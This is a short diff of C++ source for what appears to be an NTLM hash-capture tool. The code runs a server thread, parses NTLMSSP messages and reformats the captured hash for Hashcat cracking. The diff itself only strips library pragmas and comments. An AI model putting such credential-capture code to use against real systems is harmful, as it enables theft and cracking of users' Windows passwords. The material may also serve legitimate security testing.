@@ -16,14 +16,11 @@
 #include <sstream>
 #include <thread>
 
-#pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "secur32.lib")
-#pragma comment(lib, "crypt32.lib")
 
 std::string g_extractedHash = "";
 bool g_success = false;
 
-// Helper function to convert bytes to HEX format
+
 std::string ToHex(const BYTE* data, size_t len) {
     std::ostringstream oss;
     oss << std::hex << std::setfill('0');
@@ -150,8 +147,7 @@ void ServerThreadFunction(int port) {
                     const BYTE* finalRespData = ntlmResp;
                     size_t finalRespLen = ntlmRespLen;
 
-                    // KEY FIX: If the pointer points to the NTLMSSP header,
-                    // precisely correct the data to the clean format expected by Hashcat.
+                    
                     if (finalRespLen > 72 && memcmp(finalRespData, "NTLMSSP", 7) == 0) {
                         WORD realLen = 0;
                         DWORD realOffset = 0;
